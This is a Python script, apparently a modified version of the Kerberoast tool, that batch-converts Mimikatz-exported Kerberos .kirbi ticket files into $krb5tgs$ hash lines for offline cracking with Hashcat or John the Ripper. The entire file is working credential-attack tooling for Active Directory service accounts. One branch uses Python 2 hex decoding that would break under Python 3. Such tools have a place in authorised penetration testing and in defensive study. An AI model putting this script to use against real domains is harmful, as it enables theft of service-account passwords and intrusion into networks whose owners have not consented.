#!/usr/bin/env python3

# Based on the Kerberoast script from Tim Medin to extract the Kerberos tickets
# from a kirbi file (https://github.com/nidem/kerberoast).

# Modification to parse them into the JtR-format by Michael Kramer (SySS GmbH)
# Copyright [2015] [Tim Medin, Michael Kramer]
#
# Modified to parse multiple .kirbi files into JtR/Hashcat format within a single file by Austyn Guo.
# Copyright [2023] [Tim Medin, Michael Kramer, Austyn Guo]
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License

from pyasn1.codec.ber import decoder
import os
from datetime import datetime
import glob

def extract_ticket_from_kirbi(filename):
    with open(filename, 'rb') as fd:
        data = fd.read()
        return extract_ticket(data)

def extract_ticket(data):
    if data[0] == 0x76:
        return (decoder.decode(data)[0][2][0][3][2]).asOctets()
    elif data[:2] == b'6d':
        return (decoder.decode(data.decode('hex'))[0][4][3][2]).asOctets()

if __name__ == '__main__':
    import argparse
    import sys

    parser = argparse.ArgumentParser(description='Read all Mimikatz kerberos ticket files (.kirbi) within a folder, convert these and saves them in a single output file with a generation timestamp. The combined output file can then be used as input by other tools such as Hashcat or JohnTheRipper.')
    parser.add_argument('-d', '--directory', dest='directory', type=str, required=True,
                        help='Directory containing .kirbi files. e.g. can input "." for current directory')
    parser.add_argument('-o', '--output', dest='output_file', type=str,
                        help='Optional flag. This sets the filename to save output to. Default behaviour is to save in current directory.')

    args = parser.parse_args()

    timestamp = datetime.now().strftime('%Y-%m-%d-%H.%M')
    output_filename = timestamp + '_combined.txt' if args.output_file is None else args.output_file

    enctickets = []
    kirbi_files = glob.glob(os.path.join(args.directory, '*.kirbi'))

    for filename in kirbi_files:
        et = extract_ticket_from_kirbi(filename)
        if et:
            enctickets.append((et, filename))

    with open(output_filename, "w") as f:
        for et in enctickets:
            filename = os.path.basename(et[1]).replace('.kirbi', '')
            out = '$krb5tgs$23$*' + filename + '*$' + et[0][:16].hex() + '$' + et[0][16:].hex() + '\n'
            f.write(out)

    print('Tickets written: ' + str(len(enctickets)))
    combined_file_path = os.path.join(args.directory, output_filename)
    print(f"Combined file created at: {combined_file_path}")
